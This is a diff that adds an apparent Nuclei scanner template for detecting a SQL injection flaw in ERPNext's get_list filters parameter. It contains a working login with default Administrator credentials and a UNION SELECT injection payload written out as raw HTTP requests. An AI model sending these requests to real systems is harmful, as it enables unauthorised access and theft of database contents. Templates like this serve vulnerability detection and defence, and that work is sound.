@@ -1,0 +1,54 @@
+id: erpnext-sqli-frappe-db-query
+info:
+  name: ERPNext DB Query SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    ERPNext is an open source enterprise resource planning system. The `filters` parameter in
+    `frappe.model.db_query.get_list` is vulnerable to SQL injection, allowing attackers to extract
+    sensitive database information or potentially compromise the server.
+  reference:
+    - https://packetstormsecurity.com/files/162531/ERPNext-12.18.0-13.0.0-SQL-Injection.html
+  tags: sqli,erpnext
+
+http:
+  - raw:
+      - |
+        POST / HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        cmd=login&usr=Administrator&pwd=admin&device=desktop
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "\"message\":\"Logged In\""
+    extractors:
+      - type: regex
+        part: header
+        name: session_cookie
+        group: 1
+        regex:
+          - "Cookie: (.+?)"
+
+  - raw:
+      - |
+        GET /api/method/frappe.model.db_query.get_list?filters=%7b%22name%20UNION%20SELECT%2034973419%20--%20%22%3a%20%22administrator%22%7d&fields=%5b%22name%22%5d&doctype=User&limit=20&order_by=name&_=1615372773071 HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: {{session_cookie}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "\"name\":\"34973419\""
+      - type: status
+        status:
+          - 200
+    extractors:
+      - type: json
+        name: user_data
+        json:
+          - '.message[].name'
